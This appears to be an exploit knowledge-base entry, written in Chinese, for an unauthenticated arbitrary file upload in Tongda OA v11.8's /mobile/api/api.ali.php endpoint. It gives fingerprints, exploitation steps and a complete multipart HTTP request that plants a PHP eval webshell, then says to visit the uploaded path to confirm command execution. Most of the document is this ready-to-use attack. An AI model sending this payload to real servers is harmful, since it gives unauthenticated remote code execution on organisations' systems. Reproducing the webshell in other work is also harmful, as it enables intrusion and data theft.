---
id: TONGDA-API-ALI-UPLOAD
title: 通达OA v11.8 api.ali.php 任意文件上传
product: tongda-oa
vendor: 北京通达信科
version_affected: "V11.8"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["通达OA", "Office Anywhere", "api.ali.php"]
---

## 漏洞描述

通达OA v11.8 api.ali.php 接口存在未授权文件上传漏洞，可直接上传 PHP webshell。

## 影响版本

- V11.8

## 前置条件

- 无需认证
- 目标为通达OA V11.8，`/mobile/api/api.ali.php` 接口可访问

## 利用步骤

1. 构造 multipart 请求，向 `/mobile/api/api.ali.php` 上传 PHP webshell
2. 根据返回的文件路径，访问 webshell 确认命令执行

## Payload

```http
POST /mobile/api/api.ali.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

## 验证方法

上传后访问 webshell 路径确认执行。
